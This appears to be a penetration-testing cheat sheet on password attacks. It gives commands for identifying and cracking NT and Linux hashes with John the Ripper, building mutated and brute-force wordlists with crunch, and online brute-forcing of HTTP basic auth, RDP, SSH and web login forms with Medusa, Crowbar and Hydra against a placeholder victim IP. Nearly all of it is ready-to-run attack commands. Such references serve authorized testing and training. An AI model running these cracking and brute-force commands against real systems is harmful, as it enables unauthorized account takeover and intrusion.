# Passwords

---

- [Hashes](#hashes)
- [Permutate Wordlist](#permutate-wordlist)
- [Bruteforcing](#bruteforcing)
- [Network Attacks](#network-attacks)

<a name="hashes"></a>
## Hashes
### Identifying
Show hash formats that the given hash can be.
```sh
hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
```

### Cracking
Crack the hashes in hash.txt with NT format.
```sh
sudo john hash.txt --format=NT
```

Run john rules with a custom wordlist.
```sh
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

Run against unshadowed linux hashes.
```sh
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

Create 8 processes and process the first 8 parts of the list on the first machine.
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=8 --node=1-8/16 unshadowed.txt
```

Process the second 8 parts of the 16th split.
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=8 --node=9-16 unshadowed.txt
```

<a name="permutate-wordlist"></a>
## Permutate Wordlist
Add rule to wordlist generator.  
`/etc/john/john.conf` - John configuration

```sh
# Add two numbers to the end of each password
$[0-9]$[0-9]
```

Mutate the wordlist with the rules to create a new wordlist.
```sh
john --wordlist=list.txt --rules --stdout > mutated.txt
```

<a name="bruteforcing"></a>
## Bruteforcing
Crunch will generate every possible combination of a given pattern. (160GB in this example). 8 8 - Minimum 8 and maximum 8 characters.
```sh
crunch 8 8 -t ,@@^^%%%
```

4-6 characters in length containing 0-9 A-F. (118MB, 17million)
```sh
crunch 4 6 0123456789ABCDEF -o crunch.txt
```

<a name="network-attacks"></a>
## Network Attacks
Tools
- THC-Hydra
- Medusa
- Crowbar
- Spray

### Medusa
Bruteforce a htacess password with username admin and password list at the /admin url.
```sh
medusa -h __VICTIM_IP__ -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

View supported network protocols.
```sh
medusa -d
```

### Crowbar
Designed to leverage SSH keys instead of passwords. Reliable against Windows Remote Desktop Protocol (RDP).

```sh
sudo apt install crowbar
```

Bruteforce rdp with the username and password wordlist. 1 single thread as RDP does not handle multiple threads.
```sh
crowbar -b rdp -s __VICTIM_IP__/32 -u admin -C ~/password-file.txt -n 1
```

### THC Hydra
Bruteforce SSH with username john and password list of rockyou.
```sh
hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://__VICTIM_IP__
```

View service format information
```sh
hydra http-form-post -U
```

Bruteforce the web page with parameters, “INVALID LOGIN” is the content on the page when login is invalid.
```sh
hydra __VICTIM_IP__ http-form-post "/login.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```
